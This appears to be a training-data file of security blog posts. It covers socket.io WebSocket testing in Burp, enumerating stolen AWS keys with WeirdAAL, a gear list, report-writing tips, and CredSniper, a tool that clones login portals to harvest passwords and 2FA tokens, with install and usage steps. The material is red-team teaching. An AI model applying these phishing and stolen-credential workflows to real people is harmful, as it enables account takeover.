security realm to be the worst when it comes to the squirrel effect. There is always another alert, the next super critical urgent task, the next creatively named malware, or new shiny tool. It is easy to let things you find less interesting slip and assume they will be handled by others. Step up, take ownership, and be the lead to getting these items mitigated to the extent you can. Can't mitigate something? Detect it. Can\u2019t detect it? Make sure you have visibility so you can hunt for it. Can\u2019t get visibility? Make sure it is on a list to review in the future. We all know that things change in the security and computer world and a new method might be available in the near future.\n\n \n\nYou Got This!\nA penetration test can be very frustrating and disheartening. Try to keep in mind the purpose: to improve and mature your overall security. To fulfill this purpose you must do your part by reacting and following through on all the findings. So, when you have your next pen test embrace the findings for the challenge they are and strive to defeat the pen testers next time. Just don\u2019t roll a one.\n\n______\n\n*Scott is a guest blogger from undisclosed company. He works as a Security Engineer somewhere in the midwest and has his punch card almost full from attending BHIS webcasts."
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Hack WebSockets and Socket.io\"\nTaxonomies: \"Author, Ethan Robish, How-To, Socket.io, WebSockets\"\nCreation Date: \"Thu, 09 Aug 2018 15:04:39 +0000\"\nEthan Robish //\n\nWebSockets Overview \n\nWebSockets is a technology to allow browsers and servers to establish a single TCP connection and then asynchronously communicate in either direction. This is great for web apps as it allows real time updates without the browser needing to send hundreds of new HTTP polling requests in the background. It\u2019s bad for pentesters as the tool support for WebSockets is not nearly as prevalent or sophisticated as for HTTP.  \n\nIn addition to Burp Suite, a few other tools exist for dealing with WebSockets. I attempted to use each of these but none of them worked the way I wanted.\n\nZed Attack Proxy (ZAP)\n\nPappy Proxy\n\nMan-in-the-Middle Proxy (mitmproxy)\n\nWebSocket/Socket.io (WSSiP)\n\nIf you\u2019re interested in using WebSockets on the offensive side to evade detection check out this post.\n\nhttps://www.blackhillsinfosec.com/command-and-control-with-websockets-wsc2/\n\nIn this post I\u2019m going to mainly focus on socket.io, a popular WebSockets library for JavaScript. However, some of the ideas here could be applied to other libraries or generically to the WebSockets protocol as well.\n\nHow popular is socket.io? It has over 41 thousand stars on Github.\n\nIt also occupies the slots for 2nd and 3rd most popular WebSockets package on NPM.\n\nIt turns out that the excellent OWASP Juice-Shop Project uses the socket.io library so I will be using it for demonstration.\n\nhttps://github.com/bkimminich/juice-shop/search?utf8=%E2%9C%93&q=socket.io&type=\n\nThis post assumes you are already somewhat familiar with testing web applications using Burp Suite, and everything covered can be accomplished in the Community Edition. Without further ado, let\u2019s jump in.\n\nIf we go to Juice-Shop in the browser, we can quickly see the WebSocket traffic in the background. You can find this in Burp by going to Proxy->WebSockets history.\n\nUnlike HTTP where you always have request/response pairs due to the stateless nature of the protocol, WebSockets is a stateful protocol. This means that you can have any number of outgoing \u201crequests\u201d and any number of incoming \u201cresponses\u201d from the server. Since the underlying connection is TCP that is held open both the client and the server can send messages at any time without waiting for the other. This explains the differences in the WebSockets history view from the HTTP history you may be used to looking at.\n\nIn this view, you\u2019ll mostly see single-byte messages sent and received. But when the application does something interesting you\u2019ll see messages with larger payloads.\n\nBurp has some capability for testing with WebSockets. You can intercept and modify them in real-time but there is no Repeater, Scanner, or Intruder functionality for WebSockets. WebSocket interception is enabled by default in Burp and all you need to do is turn on the master interception.\n\nYou\u2019ll get intercepted WebSocket messages the same way you do for HTTP. You can also edit them in the interception window.\n\nAnd view the edited messages in the WebSockets history tab.\n\nDowngrading WebSockets to HTTP\n\nMethod 1: Abusing Socket.io\u2019s HTTP Fallback Mechanism\n\nOne oddity I quickly noticed was that sometimes I would see similar messages in the HTTP history as I had seen in the WebSockets history. If you recall from above, the interesting WebSockets message I pointed out had to do with solving the scoreboard challenge. Below shows the same response from the server except this time in HTTP history. So I knew that socket.io was capable of sending messages both over WebSockets or HTTP.\n\nI guessed that HTTP was available in order to fall back on in case WebSockets was not supported or somehow blocked in the application. The transport parameter drew my attention with its values of \u201cwebsockets\u201d and \u201cpolling\u201d in the requests I observed.\n\nThis section in socket.io\u2019s documentation talks about how \u201cpolling\u201d and \u201cwebsockets\u201d are the two default transport options. It also shows how you can disable polling by specifying WebSockets as the sole transport. I figured the reverse would be true as well and that I could specify polling as the sole transport mechanism.\n\nhttps://socket.io/docs/client-api/#with-WebSocket-transport-only\n\nBy searching through socket.io.js source code I came across the following, which certainly looked promising.\n\nthis.transports=n.transports||[\"polling\",\"WebSocket\"]\n\nThat line of code is setting an internal variable called \u201ctransports\u201d to some value passed in OR defaulting to [\"polling\",\"websocket\"] if the passed in value is false/empty. That would definitely fit our understanding so far of the default transports being polling and WebSockets. Let\u2019s see what happens if we set up a match and replace rule under Proxy->Options in Burp to change these defaults.\n\nSuccess! After the rule was added, refresh the page (I also had to enable Burp\u2019s built-in rule to \u201cRequire non-cached response\u201d or perform a forced refresh), and no more communication was sent via WebSockets.\n\nThat\u2019s great, but what if the application you are using already provides transport options which would take precedence over our new defaults? In this case, we can just modify our match and replace the rule. The following rule should work for different versions of the socket.io library, and disregard any transports specified by the application developers.\n\nFor ease of copy-paste here are the strings to use:\n\nthis\\.transports=.*?\\.transports\\|\\|\\[\"polling\",\"websocket\"]\n\nthis.transports=[\"polling\"]\n\nBe sure to set this as a regex match.\n\nMethod 2: Interrupting the WebSockets Upgrade\n\nMethod 1 is specific to socket.io and could possibly be extended to other client libraries. But the following method should be a little more universal as it targets the WebSockets protocol itself.\n\nAfter some investigation, I found that WebSockets first communicates over HTTP in order to negotiate with the server and \u201cupgrade\u201d a connection to a WebSocket. The important parts of this are:\n\n1) The client sends requests an upgrade request with some WebSocket specific headers.\n\n2) The server responds with a status code of 101 Switching Protocols, also with some WebSocket specific headers.\n\n3) The communication transitions to WebSockets and we don\u2019t see any more HTTP requests for this particular conversation.\n\nThe WebSockets RFC section 4.1 gives all sorts of clues on how we can interrupt this workflow.\n\nBelow is an excerpt from https://tools.ietf.org/html/rfc6455#section-4.1 with my own added emphasis.\n\nIf the status code received from the server is not 101, the client handles the response per HTTP [RFC2616] procedures. In particular, the client might perform authentication if it receives a 401 status code; the server might redirect the client using a 3xx status code (but clients are not required to follow them), etc. Otherwise, proceed as follows.\n\n If the response lacks an |Upgrade| header field or the |Upgrade|header field contains a value that is not an ASCII case-insensitive match for the value \"WebSocket\", the client MUST_Fail the WebSocket Connection_. \n\n If the response lacks a |Connection| header field or the |Connection| header field doesn't contain a token that is an ASCII case-insensitive match for the value \"Upgrade\", the client MUST _Fail the WebSocket Connection_. \n\n If the response lacks a |Sec-WebSocket-Accept| header field or the |Sec-WebSocket-Accept| contains a value other than the base64-encoded SHA-1 of the concatenation of the |Sec-WebSocket-Key| (as a string, not base64-decoded) with the string \"258EAFA5-E914-47DA-95CA-C5AB0DC85B11\" but ignoring any leading and trailing whitespace, the client MUST _Fail the WebSocket Connection_. \n\n If the response includes a |Sec-WebSocket-Extensions| header field and this header field indicates the use of an extension that was not present in the client's handshake (the server has indicated an extension not requested by the client), the client MUST _Fail the WebSocket Connection_. (The parsing of this header field to determine which extensions are requested is discussed in Section 9.1.) \n\nWith those \u201cMUST Fail\u201d conditions in mind, I came up with the follow set of replacement rules which should fail on all five.\n\nOnce those rules were in, all WebSocket upgrade requests failed. Since socket.io will silently fail to HTTP by default this has the desired effect. Specific implementations or other libraries may behave differently and cause errors in the application you are testing. But our jobs are to make software do things it wasn\u2019t meant to!\n\nThe original response looked like this and would have resulted in the client and server transitioning to WebSockets for communication.\n\nInstead, the client received this modified response from the server and by the RFC should fail the WebSockets attempt.\n\nOne thing I encountered during a test was that after putting these match and replace rules in, the client was extraordinarily persistent in retrying WebSockets connections and caused a lot of unwanted traffic in my HTTP history. If you are dealing with the socket.io library, it is probably easiest to use Method 1 above. If you have a different library or situation you may have to add more rules to convince the client that the server does not support WebSockets or even cripple the WebSockets functionality in the client library.\n\nUsing Burp Repeater as a Socket.io Client\n\nSince we\u2019ve forced communication to go over HTTP instead of WebSockets you can now add in custom match and replace rules that will apply to the traffic that would have gone over WebSockets!\n\nNext, we can go one step further and pave the way for using tools like Repeater, Intruder, and Scanner. These changes will be specific to the socket.io library.\n\nThere are a couple of problems that prevent us from repeating the HTTP requests that socket.io uses.\n\nEach request has a session number and any invalid requests will cause the server to terminate that session.\n\nThe body of each request has a calculated field for the length of the message.  If this is incorrect, the server treats it as an invalid request and terminates the session.\n\nHere are a couple of example URLs used in the application.\n\n/socket.io/?EIO=3&transport=polling&t=MJJR2dr\n\n/socket.io/?EIO=3&transport=polling&t=MJJZbUa&sid=iUTykeQQumxFJgEJAABL\n\nThe \u201csid\u201d parameter in the URL represented a single connection stream to the server. If an invalid message was sent (as is common when trying to break things) then the server would close the entire session and I had to start over with a new session.\n\nThe body of a given request contained a field with the byte count of the payload. This is similar to the \u201cContent-Length\u201d HTTP header except it was specific to the socket.io payload. For instance, if the payload you wanted to send was \u201chello\u201d then the body would be \u201c5:hello\u201d and the Content-Length header would be 7. That's 5 for the letters in \u201chello\u201d and 7 accounts for both the letters in \u201chello\u201d as well as the \u201c5:\u201d which socket.io adds to the body. As always, Burp will update the Content-Length header for us so we don\u2019t need to worry about that. But I could not find a good way to automatically calculate and include the length of the payload. To complicate matters more, I witnessed socket.io sending multiple messages within the same HTTP request. Since each was an encapsulated WebSockets payload, each had its own length and ended up looking something like this: \u201c5:hello,4:john,3:doe\u201d (the actual syntax may have been different but you get the idea). Any error in calculating the length and the server would reject it as an invalid message and bring us back to problem #1.\n\nThis is an example of a message body. This is from a response in the Juice-Shop app but the requests were formatted the same. Note that \u201c215\u201d here represents the length of the payload following the \u201c:\u201d.\n\n215:42[\"challenge solved\",{\"key\":\"zeroStarsChallenge\",\"name\":\"Zero Stars\",\"challenge\":\"Zero Stars (Give a devastating zero-star feedback to the store.)\",\"flag\":\"e958569c4a12e3b97f38bd05cac3f0e5a1b17142\",\"hidden\":false}]\n\nMacro\n\nI was able to solve the first problem using a Burp Macro. Basically, each time Burp matched on a server rejection of a message, the macro would automatically establish a new session and update the original request with the valid \u201csid\u201d. Create a new macro by going to Project options->Sessions->Macros->Add\n\nThe URL to establish a new session was simply crafted by leaving off the \u201csid\u201d parameter.  For instance:\n\n/socket.io/?EIO=3&transport=polling&t=MJJJ4Ku\n\nI found that the value of \u201ct\u201d didn\u2019t really matter so I left it untouched.\n\nThe server response included a brand new \u201csid\u201d value for us to use.\n\nNext, click the \u201cConfigure item\u201d button and fill in the parameter name as \u201csid\u201d.  Use the \u201cExtract from regex group\u201d option and the following regex.\n\n\"sid\"\\:\"(.*?)\"\n\nYour configuration window should look something like this:\n\nSession Handling Rule\n\nNow that we have a macro, we need a way for it to be triggered. This is where Burp Session Handling Rules come in. Create a new rule by going to Project options->Sessions->Session Handling Rules->Add\n\nCreate a new Rule Action for \u201cCheck session is valid\u201d\n\nConfigure the new rule action as follows:\n\nFinally, after finishing your new rule action, modify the scope of the rule. Here is where you can decide where you want this rule to apply. I\u2019d recommend using it for Repeater at least so you can manually repeat requests.\n\nThe following is how I configured the scope rules. You can get more specific with your scope but the options below should work for most.\n\nHere is a request made without the session handling rule in place.\n\nAnd here is the same request made with the rule in place. Notice that the session handling rule transparently updates the cookies and the value for \u201csid\u201d in the request for you.\n\nFinal Thoughts\n\nUltimately, I was prevented from using Burp Scanner and Intruder by problem #2 discussed above. I modified an existing Burp plugin and that appeared to do the job, but the server didn\u2019t like it for some reason. If anyone is interested in furthering this research feel free to reach out to me.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"AWS: Assuming Access Key Compromise\"\nTaxonomies: \"Red Team, Red Team Tools, AWS, Carnal0wnage, Compromise, SEC504, WeirdAAL\"\nCreation Date: \"Mon, 06 Aug 2018 14:42:48 +0000\"\nJordan Drysdale//*\n\nIn this blog, we are assuming that we have obtained an access key, a secret key and maybe a .pem key from a network user who left these things lying around. What services do they have access to? How far can we get?\nHere we stand again, on the shoulders of giants with the prospect of using their efforts to take advantage of someone else\u2019s mistake. In this case, that giant is Carnal0wnage. His effort, the WeirdAAL (https://github.com/carnal0wnage/weirdAAL) toolkit, is another brilliant piece of work designed to audit the privileges belonging to a stolen set of AWS keys.\n\nI cloned the utility in to /opt/ and checked out the README.md, which sends you back over to the wiki. Some commands here:\n \ncd weirdAAL\n\napt-get install python3-venv (if required)\n\npython3 -m venv weirdAAL\n\nsource weirdAAL/bin/activate\n\npip3 install -r requirements.txt\n\npython3 create_dbs.py\n\ncp env.sample .env\n\nvim .env (insert keys in ignition, here)\n\n \nThen, head over to usage and run the recon_all. My command looked like this:\npython3 weirdAAL.py -m recon_all -t MyTarget > recon_out.file\n \nWe get results sorted per \u2018enumerable\u2019 service on AWS. This compromised user did not have IAM or root privileges.\n\nHowever, the user has some EC2 privileges and access to a few other services.\n\nTo wrap up cleanly, we\u2019ve compromised a domain user and stolen their AWS credentials (access and secret key). Using Carnal0wnage\u2019s recon_all flag, we know exactly what this user can do on AWS. Further research might lead us in to another series of tools for AWS investigations: https://github.com/toniblyx/my-arsenal-of-aws-security-tools (H/T @dafthack).\nAnother day, another way. Cheers, and happy cloud securing.\n\n*Join Jordan and Kent Tuesday, August 7th for their webcast as they walk through an Active Directory best practices environment. The deployment includes two Amazon Web Services (AWS) Active Directory Domain Controllers in a multi-availability zone configuration. The best practices will also cover some AWS basics, deploying your domain in the cloud, and lots more. Register here: https://attendee.gotowebinar.com/register/4918848176372744707?source=b"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Your Infosec Supply List\"\nTaxonomies: \"Fun & Games, General InfoSec Tips & Tricks, InfoSec 101, InfoSec 201, Blue Team, books, Getting into Infosec, infosec 101, infosec books, Red Team, tools\"\nCreation Date: \"Thu, 16 Aug 2018 13:18:28 +0000\"\nBre Schumacher //\n\nAs I was walking through the back to school display at the store the other day, I picked up a handy-dandy school supply list. Of course there were all the usual things: scissors, glue, notebooks, etc. but it made me wonder what would be on the \"supply list\" for someone just starting out in the infosec field. So I asked one of our testers, Jordan, to help create such a list!\n\nFor those of you who are starting a new chapter venturing into information security, here is your unofficial \"official supply list.\" And for anyone who's been around this stuff for a while, what else would you add to this list? Make sure to tweet us (https://twitter.com/bhinfosecurity?lang=en )your suggestions! Please note that some of these may seem like they lean more to the \"red team\" or \"blue team\" side, but we believe they can be useful in both situations. Not sure how? Feel free to contact us to ask more questions.\n\nInfosec Supply List 2018 (all items are not required, but they are highly recommended)\n\nBooks\n\nBlue Team Field Manual (BTFM): www.amazon.com/Blue-Team-Field-Manual-BTFM/dp/154101636X/\n\nRed Team Field Manual (RTFM): www.amazon.com/Rtfm-Red-Team-Field-Manual/dp/1494295504/\n\nOffensive Countermeasures: www.amazon.com/Offensive-Countermeasures-John-Strand/dp/1974671690/\n\nOther Items\n\nCubicles & Compromises (IR Tabletop Game): www.blackhillsinfosec.com/tabletop/\n\nBash Bunny: hakshop.com/products/bash-bunny\n\nRubber Ducky: hakshop.com/products/usb-rubber-ducky-deluxe\n\nWifi Pineapple: hakshop.com/products/wifi-pineapple\n\nAlfa Wireless Adapter: www.amazon.com/AWUS036NEH-Range-WIRELESS-802-11b-USBAdapter/dp/B0035OCVO6/\n\n32GB USB drives: www.amazon.com/Kingston-Digital-DataTraveler-32GB-DTSE9H/dp/B00DYQYJ0E/\n\nTracFone for identity management: https://www.target.com/b/tracfone/-/N-5y62p\n\nAccessories\n\nBlack Hoodie: www.amazon.com/Hanes-EcoSmart-Fleece-Hoodie-Black/dp/B00JUM4CT4/\n\nWriting utensils in photo above (black to match the hoodie, of course!): www.amazon.com/Crayola-My-Color-is-Black/dp/B011TNIQCA/\n\nBHIS Sticker: We try to go to several events each year. Make sure to stop by our booth, say hi and grab a sticker!\n\nTicket to Wild West Hackin' Fest: www.wildwesthackinfest.com\n\nAnd don't forget to check out these great resources:\n\n30 Things to Get You Started: www.blackhillsinfosec.com/30-things-to-get-you-started/\n\nThe BHIS Blog is a trove of information: www.blackhillsinfosec.com/blog/\n\nJohn's 5 year plan: www.youtube.com/watch?v=Uv-AfK7PkxU&t=1s\n\nOur YouTube channel: www.youtube.com/channel/UCJ2U9Dq9NckqHMbcUupgF0A\n\nThe BHIS podcasts: www.blackhillsinfosec.com/podcasts/\n\nAnd don't forget to sign up for our email list to be notified of upcoming webcasts: blackhillsinfosec.us15.list-manage.com/subscribe?u=e12efe2af6573cc76c90fc019&id=b7b017ed3a\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Stealing 2FA Tokens on Red Teams with CredSniper\"\nTaxonomies: \"Author, Mike Felch, Phishing, Red Team, 2FA, multi-factor, phishing, Red Team\"\nCreation Date: \"Mon, 20 Aug 2018 14:00:06 +0000\"\nMike Felch //\n\nMore and more organizations are rolling out mandatory 2FA enrollment for authentication to external services like GSuite and OWA. While this is great news because it creates an added level of security to the external perimeter, it also forces red teams and pentest organizations to innovate new techniques into capturing 2FA tokens instead of just obtaining employee credentials. Over the years, there has been a number of attack primitives related to obtaining 2FA tokens. In some cases, attackers would attempt to spoof GSM on mobile phones, try to brute force tokens or even bypass 2FA requirements altogether by searching for legacy portals that have multi-factor disabled. Recently, attackers have started social engineering victims into sending their tokens through SMS messages by scamming users with a fake password reset initiation on the account. While some of the techniques may work from time to time, the likelihood of them being a sound attack path is fairly unlikely. CredSniper was originally birthed out of a need while on a red team engagement and since then has morphed into a sound method of successfully obtaining credentials and 2FA tokens from even highly-technical senior staff.\n\nIntroducing CredSniper\n\nPhishing credentials has been going on for years and most organizations are beginning to roll out awareness training in their normal onboarding processes. The problem I see regularly is that organizations are training on how to spot red flags in emails instead of instilling healthy internet behaviors, regardless of the communication platform. If I can lure an unsuspecting victim to an exact clone of an authentication portal they are already familiar with, most will hand over their credentials and 2FA tokens if I ask nicely. This is where CredSniper really shines!\n\nHTTPS is Mandatory\n\nAside from protecting targets on an engagement from putting their credentials in a non-HTTPS site, it\u2019s equally important to ensure the quality of the cloned authentication portal doesn\u2019t reveal the red flags most organizations train to recognize. This is mandatory if you are cloning a GSuite portal because Google Chrome browser will alert the target that the site is a malicious looking site. The moment you switch over to HTTPS, this problem resolves itself because Google isn\u2019t intercepting the request and response payload between the visitor and the server. During the installation, CredSniper will request a new SSL certificate from Let\u2019s Encrypt for the host you supply. The only prerequisite is that the hostname you plan to use is pointing to the IP address of the server hosting the cloned portal.\n\nModular Authentication Portals\n\nWhile CredSniper comes with a module for GSuite, new modules can be created with minimum overhead. In the future, this will be much more streamlined but in the meantime, users can create a new portal module in 5-10 minutes. The module defines the mapping between templates and routes. For instance, if someone accesses /login then the module will know to load the correct template for that phase of the authentication process. The idea behind CredSniper was that functionality could be written to authenticate with the genuine portal behind the scenes and during the interaction with the target. By authenticating with the genuine site, the 2FA SMS token would be sent to the target and CredSniper could prompt the user to enter it.\n\nTemplates are the HTML copy of the genuine portal but with the necessary templating tags. CredSniper uses a templating language called Jinja2 which provides a seamless way to personalize phishing pages with user-supplied data. For instance, some authentication portals like GSuite first ask the user for an email address before sending them to a password page and then on to the 2FA page. Within the password page, GSuite displays the users profile image right next to their email address. Because CredSniper captured the email address at the first stage of the phish, using it in subsequent pages is as simple as placing the tag {{ username }} in the HTML template. Jinja2 automatically replaces the tag with the value when rendering the template. Any number of routes can be configured within the module to account for all different variations of authenticating processes.\n\nAPI Integration\n\nCredSniper also comes with a light-weight API so users can integrate the harvested credentials in other applications. Due to 2FA token expiration occurring fairly quick, the API provides a fast way of consuming the credentials to automate authentication tasks before it\u2019s too late. Upon running CredSniper, an API token will be displayed on the screen which will provide the ability to consume the end-points for viewing credentials, marking them as seen and for updating the configuration.\n\nView Credentials (GET)\n\nhttps:///creds/view?api_token=\n\nMark Credential as Seen (GET)\n\nhttps:///creds/seen/?api_token=\n\nUpdate Configuration (POST)\n\nhttps:///config\n\n{\n\n   'enable_2fa': true,\n\n   'module': 'gmail',\n\n   'api_token': 'some-random-string'\n\n}\n\nSimple Installation\n\nIn order to kick-off the installation, CredSniper requires the DNS to be configured for the hostname you plan on using. As mentioned earlier, Let\u2019s Encrypt needs to be able to verify the hostname before issuing an SSL certificate so the hostname needs to be assigned to the IP address of the host where CredSniper is being hosted. Some people have reported that the installation script will throw errors on distros other than Ubuntu 16.04. While it\u2019s possible to get everything installed and running on other Linux versions or distributions, it\u2019s highly recommended to use Ubuntu 16.04 to avoid problems that might require troubleshooting.\n\nThe first thing you will want to do is clone the GitHub repo, this will grab all the necessary files and also provide an easy way to upgrade, as new code is pushed. Once it\u2019s cloned, switch directories and run the install.sh script.\n\n$ git clone https://github.com/ustayready/CredSniper\n$ cd CredSniper\n~/CredSniper$ ./install.sh\n\nThe install script will request information from you in order to configure the required parameters and kick-off the initial running of CredSniper. These parameters can be passed in as flags in future runs of CredSniper.\n\nModule to deploy (ex: gmail): This is the CredSniper module that will be run. For a list see the modules/ directory.\n\nFinal redirect URL: The final destination URL for the target\u2019s browser after phishing. This should coincide with your ruse in order to eliminate suspicion in the mind of the target.\n\nEnable SSL? [Y/n]: Whether to phish using SSL or not. This may be required in future versions due to how the browser\u2019s flagging suspicious looking sites.\n\nEnable two-factor phishing? [Y/n]: This option is whether or not to control two-factor phishing without having to change the module routes. Sometimes two-factor is not enabled and being able to disable it from the command-line is convenient.\n\nEnter hostname for certificates (ex: app.example.com): This hostname will be used by Let\u2019s Encrypt in order to retrieve an SSL certificate for CredSniper. In order for CredSniper to be reachable by this hostname, the DNS for the hostname must be pointing to the IP address of the hostname before install.sh is run.\n\nPort to listen on (default: 80/443): CredSniper only runs in either HTTP or HTTPS mode, not both. Sometimes portals that are cloned run on alternative ports, in order to look legit, CredSniper can be configured to run on alternative ports. By default, if CredSniper is running in HTTP mode then port 80 is assigned. If running in HTTPS mode, 443 is assigned.\n\nA number of pre-requisites will also be installed if they are not already present:\n\nLet\u2019s Encrypt Apt Repository\n\nPython3\n\nVirtualEnv\n\nGnuPG\n\nCertBot\n\nPython3 modules: Flask, mechanicalsoup, pyopenssl\n\nUsing Python3, a virtual environment will be created and the necessary Python3 modules will be installed. Next, port binding for Python will be enabled so listening on port 80/443 can be possible from userland. Finally, the certificate and private key for the SSL certificate will be copied into the certs/ folder.\n\nAfter a successful installation of everything, CredSniper will be ran! The install.sh script will not be required for future executions of CredSniper. In order to execute CredSniper, simply run the python script: python credsniper.py --help\n\nIf you happen to log out of the host and want to run CredSniper at a later time, be sure to first activate the Python virtual environment before running credsniper.py:\n\n~/$ cd CredSniper~/CredSniper$ source bin/activate(CredSniper) ~/CredSniper$ python credsniper.py --help\n\nThat\u2019s it!\n\nFlexible Usage\n\nCredSniper comes with a flexible ability to run in a number of different configurable modes. In order to access the flags, simply pass the --help during execution.\n\nusage: credsniper.py [-h] --module MODULE [--twofactor] [--port PORT] [--ssl] [--verbose] --final FINAL --hostname HOSTNAME\n\noptional arguments:\n-h, --help                           show this help message and exit\n--module MODULE             phishing module name - for example, \"gmail\"\n--twofactor                          enable two-factor phishing\n--port PORT                          listening port (default: 80/443)\n--ssl                                use SSL via Let's Encrypt\n--verbose                            enable verbose output\n--final FINAL                        final url the user is redirected to after phishing is done\n--hostname HOSTNAME          hostname for SSL\n\nIf you choose to monitor phished credentials without using the built-in API, there are two files you should be familiar with:\n\nTemporary cached credentials\n\n.cache : The cache file provides an intermediate aggregation of credentials that pass through the username and password phase of the phish. Originally designed to temporarily store credentials when two-factor is enabled, it was to prevent a loss of credentials in the event a target doesn\u2019t complete the two-factor step.\n\nPhished credentials\n\n.sniped : The sniped file provides a flat-file storage of captured credentials along with other information like two-factor information, IP address, and geolocation information. In some cases, if you authenticate with credentials from a new location to sites like Gmail, they will prompt you to supply the last location you authenticated from. By grabbing the IP address of the phished target and quickly geolocating them, you can supply an accurate answer.\n\nCloning Pages\n\nWhile the only built-in module that has been made public is Gmail, there is also an example module in the modules/ directory that will help you quickly create new modules. In order to quickly clone a page, I tend to start by using a FireFox plugin called \u2018Save Page WE\u2019 which will conveniently embed external resources internally in a single HTML page. This makes it convenient and avoids loading embedding resources hosted by the cloned website, hopefully removing any call-backs that CredSniper might have accidentally made. Be sure to follow the example module HTML templates in order to include the correct templating parameters. Stay tuned for a future blog post on how to clone pages for CredSniper or check out our Tradecraft Security Weekly video \u201cPhishing 2FA Tokens with CredSniper\u201d on YouTube.\n\nThe concept is fairly straightforward, for every page you are trying to clone you will need a new template. The new template will be loaded from your module and triggered by a route within CredSniper. Without getting into the weeds here, the module is loaded by CredSniper and each route will be auto-added to the built-in web server. Each route is assigned a function within the module and it\u2019s the responsibility of the module to load the template. If your HTML template is in the modules/module/templates/ directory and contains the proper {{template}} language, CredSniper will automatically replace the templating language with the correct value. With some sites like Gmail, there are multiple pages. Consider the lifecycle of the authentication process:\n\nA user supplies an email address, Google verifies the account\n\nIf not valid, lets the user know the email is invalid\n\nIf valid, continues \n\nA user password is requested by Google\n\nIf not valid, let\u2019s the user know the password is invalid   \n\nIf valid and 2FA not active, redirects to GSuite   \n\nIf valid and 2FA active, continues \n\nA 2FA token is requested by Google, this is driven from the default user enrollment\n\nIf SMS, triggers text message to user with code   \n\nIf Authenticator, prompts for OTP code   \n\nIf Yubikey, prompts to insert and activate U2F device   \n\nIf Touch prompt, prompts user to touch phone   \n\nIf user-agent reflects unknown browser, prompts for SMS :)   \n\nIf valid token, redirects to GSuite   \n\nIf valid token but suspicious context, prompt for additional information \n\nThe way CredSniper handles all of this is straightforward:\n\nPrompt user for email\n\nLoad profile image using email behind the scenes using Google\u2019s Picaso service \n\nPrompt user for password\n\nAuthenticate behind the scenes with the email and password then identify if 2FA is enabled.   \n\nIf 2FA is enabled, capture additional information (i.e. last few digits of SMS, OTP app name (Duo/Authenticator/etc), IP address, geolocation   \n\nIf 2FA is disabled, redirect to final destination URL configured in CredSniper \n\nPrompt user for 2FA token\n\nRedirect to final destination URL :) \n\nCheck out an example phishing workflow:\n\nFinal Thoughts\n\nCredSniper has been an enormous success for our engagements at Black Hills and we have received lots of great feedback from users. I wanted to take a second and also shine some light on another great tool called evilginx2 by a friend named Kuba Gretzky. Evilginx2 will proxy connections between the target and phished website then intercept credentials and two-factor tokens by hosting its own HTTP and DNS server. If CredSniper isn\u2019t what you are looking for, I strongly suggest giving evilginx2 a try.\n\nCredSniper - https://github.com/ustayready/CredSniper\n\nEvilginx2 - https://github.com/kgretzky/evilginx2\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"DOs and DONTs of Pentest Report Writing\"\nTaxonomies: \"How-To, Informational, Red Team, pentest report, Pentesting, reports\"\nCreation Date: \"Thu, 23 Aug 2018 14:13:54 +0000\"\nMelisa Wachs//\n\nThe first day of school has started for your school-age kiddos. What better time to run through some of our basic reporting guidelines with y\u2019all? Here is a short list of points I\u2019ve learned after ten years of reading and editing pen test reports here at Black Hills Information Security.\n\nDO: Set up a shared place where your team can communicate consistencies. If you have more than one author, it\u2019s good to have one \u201cvoice\u201d to your report. At BHIS the testers write in 3rd person, past tense, etc.\n\nDON\u2019T: Be a lone wolf. If you work as a team you will all improve and get better.\n\nDO: Remember that the report is the deliverable for all the awesome testing you\u2019ve done, but it\u2019s of no value unless you can communicate with the customer. You can make the report educational, informative and fun for your readers.\n\nDON'T: Offend your customer. Take your ego out of the equation. The report is not a personal platform for you to show off how great you are, or boast about how weak a customer\u2019s environment may be.\n\n A Solid Report is a Key to Earning Returning Customers \n\nDO: Remember that it is your role to help improve the entire industry by educating each customer you have. It is our goal to have returning customers, and that happens by having an educator\u2019s attitude with charity toward your customers.\n\nDON\u2019T: Don\u2019t have a condemning or demeaning attitude in your reports. Your customers came to you for a reason. What does this look like and how do you watch for it? Look at your descriptive adjectives and adverbs. Are you over-emphasizing with emotion? If so, you\u2019re likely delivering a toned report.\n\nDO: Start with a fresh reporting document each time.\n\nDON\u2019T: Copy/pasting from an old report. This is not acceptable and easily leads to including information from a previous customer. Identifying other customers in a report is bad. Very, very bad.\n\nDO: Remember your audience, and executives need a section that speaks to them. The tech personnel needs their own methodology.\n\nDON\u2019T: Don\u2019t speak only to the tech people, or to the execs. Simply put, make sure you\u2019re bringing value to all facets of the company.\n\nDO: Take ratings seriously. You\u2019re the expert, after all. Be sure to give your reasons for the rating.\n\nDON\u2019T: Take ratings too seriously. If a customer feels like the rating should shift because of some political or specific situation within their environment, let them. They\u2019re experts on their environment, after all.\n\nDO: If you haven't already done so, consider implementing a tech review and a grammatical review before delivering a report to the customer. This ensures two lines of defense before a report goes to a customer.\n\nDON\u2019T: Reviewers are an asset, not a threat. Don\u2019t be combative within your team over having a report edited. If you\u2019re new to pentesting (or even new to a company) they are likely going to want to have your reports edited and watched closely at first.\n\nDO: Take notes and screenshots while you test. I promise that this will make your life so much easier when you sit down to write a report.\n\nDON\u2019T: Procrastinate. Write the report as soon as you can, preferably as you actually test. If you\u2019re unclear or sloppy, you will likely be called out by the customer to explain further. Also, the fresher the information is in your mind, the better the report will be. Imagine you have to defend your test to lawyers, via only the report. That line of thinking is a solid way of ensuring a detailed and swift reporting process.\n\n From the Archives, yr 199-Strand Last Day of Summer, First Day of School Pic \n\nHere\u2019s to another school year beginning and a continuation of lifelong learning!\n\n"
    },
    {
        "input": "",
        "instruction": "",
